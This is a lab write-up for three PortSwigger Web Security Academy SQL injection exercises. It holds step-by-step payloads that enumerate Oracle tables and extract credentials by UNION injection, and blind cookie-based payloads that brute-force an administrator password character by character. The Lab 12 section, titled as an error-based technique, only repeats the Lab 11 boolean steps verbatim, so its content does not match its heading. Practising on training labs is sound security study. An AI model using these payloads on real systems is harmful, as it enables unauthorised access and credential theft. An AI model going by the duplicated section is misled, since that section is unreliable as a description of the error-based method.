# SQL Injection Part 3: Portswigger Labs
### [Lab 10: SQL injection attack, listing the database contents on Oracle](https://0a4000fb036fe53ec00903d500a80086.web-security-academy.net/filter?category=Lifestyle)
**To solve: Login as the administrator**

**STEP 1:**
Find number of columns 
```html
' UNION SELECT null,null FROM DUAL--
```

**STEP 2:**
Find columns that contains text
```html
' UNION SELECT 'a', 'a' from DUAL--
```

**STEP 3:**
Output the list of tables in the database 
```html
' UNION SELECT table_name,null FROM all_tables--
```

**STEP 4:**
Output the column names of the users table
```html
' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name = 'USERS_RANDOM'--
```

**STEP 5:**
Use the USERNAME_RANDOM and PASSWORD_RANDOM column and USERS_RANDOM table to get credentials
```html
' UNION SELECT USERNAME_RANDOM,PASSWORD_RANDOM FROM USERS_RANDOM--
```

**STEP 6:**
Login

### [Lab 11: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

**To solve: Login as administrator**

**STEP 1**
Finding vulnerable parameter which here is tracking cookie
```html
trackingId = "xxxxxxxxxxxxx' and 1=0--
```

> If this tracking id exists -> query returns value -> Welcome back message

> If the tracking id doesn't exist -> query returns nothing > no welcome back message

**STEP 2:**
Confirm users table exist
```html
trackingId = xxxxxxxxxxxxx' and (select 'x' from users LIMIT 1) = 'x'--
```

**STEP 3:**
Confirm that username administrator exists in users table
```html
trackingId = 'xxxxxxxxxxxxx' and (select username from users where username='administrator') = 'administrator'--
```

**STEP 4:**
Enumerate the password length
```html
trackingId = 'RVLfBu6s9EZRUVYN' and (select username from users where username = 'administrator' and LENGTH(password) > 1 ) = 'administrator'--
```

> we graually increase the length of password till we don't get welcome back message

> Till 19 character we get welcome back message -> password is exactly 20 character

**STEP 5:**
Enumerate the password
```html
trackingId = 'RvLfBu6s9EZRLVYN' and (select substring(password,1,1) from users where username='administrator')='a'--
```

> substring divides the password -> This give us oppurunity to bruteforce each character at a time

**STEP 6:**
Login

### [Lab 12: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

**To solve:**
Login as administrator

**STEP 1**
Finding vulnerable parameter which here is tracking cookie
```html
trackingId = "xxxxxxxxxxxxx' and 1=0--
```

> If this tracking id exists -> query returns value -> Welcome back message

> If the tracking id doesn't exist -> query returns nothing > no welcome back message

**STEP 2:**
Confirm users table exist
```html
trackingId = xxxxxxxxxxxxx' and (select 'x' from users LIMIT 1) = 'x'--
```

**STEP 3:**
Confirm that username administrator exists in users table
```html
trackingId = 'xxxxxxxxxxxxx' and (select username from users where username='administrator') = 'administrator'--
```

**STEP 4:**
Enumerate the password length
```html
trackingId = 'RVLfBu6s9EZRUVYN' and (select username from users where username = 'administrator' and LENGTH(password) > 1 ) = 'administrator'--
```

> we graually increase the length of password till we don't get welcome back message

> Till 19 character we get welcome back message -> password is exactly 20 character

**STEP 5:**
Enumerate the password
```html
trackingId = 'RvLfBu6s9EZRLVYN' and (select substring(password,1,1) from users where username='administrator')='a'--
```

> substring divides the password -> This give us oppurunity to bruteforce each character at a time

**STEP 6:**
Login




